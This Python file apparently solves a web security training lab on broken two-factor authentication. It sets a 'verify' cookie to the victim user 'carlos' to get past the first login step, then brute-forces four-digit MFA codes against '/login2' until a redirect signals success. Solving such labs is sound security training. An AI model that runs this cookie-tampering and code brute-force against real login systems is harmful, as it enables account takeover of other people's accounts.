from web_security_academy.core.logger import logger
from bs4 import BeautifulSoup


def solve_lab(session):
    # This lab doesn't verify that the initial login step was completed.
    # Therefore, we can visit "/login2" and send generate a security code
    # to log in as carlos. From there we can brute-force the security code.

    session.cookies.set("verify", "carlos")
    logger.info(
        'Generating a security code for "carlos" by visiting "/login2" with the following cookies:'
    )
    logger.info(session.cookies.get_dict())
    session.get_path("/login2")

    logger.info("Brute-forcing the security code... (Range: 0000 - 1999)")
    logger.toggle_newline()
    for i in range(2000):
        data = {"mfa-code": f"{i:04d}"}
        resp = session.post_path("/login2", data=data, allow_redirects=False)

        if resp.status_code != 302:
            logger.info(f"{i:04d} => Incorrect")
        else:
            logger.success(f"{i:04d} => Correct!")
            session.post_path("/login2", data=data)
            break
    else:
        logger.failure("Unable to brute-force security code.")
    logger.toggle_newline()
